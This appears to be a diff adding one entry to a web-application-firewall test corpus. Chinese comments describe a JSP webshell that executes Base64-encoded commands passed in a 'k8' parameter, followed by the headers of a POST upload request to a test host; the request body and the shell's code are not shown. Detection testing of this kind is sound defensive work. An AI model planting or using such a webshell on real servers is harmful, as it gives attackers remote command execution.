@@ -1,0 +1,15 @@
+# webshell-80000441
+# 这个webshell允许攻击者通过HTTP请求执行操作系统命令，其中使用了Base64编码来隐藏命令内容。攻击者可以通过提供经Base64编码的命令参数（k8参数）来执行系统命令，并查看命令的输出结果。
+# 基本信息：
+# - 文件名：k81.jsp
+# - 文件大小：716B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv25oz HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25oz
+RM-PRO-Token: bb45441e8dfc296878851965da1320b5
+RM-PRO-Time: 1742808496351
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=xP1E18huArccsqfeK8HgRxoHcD7rmd8d
+
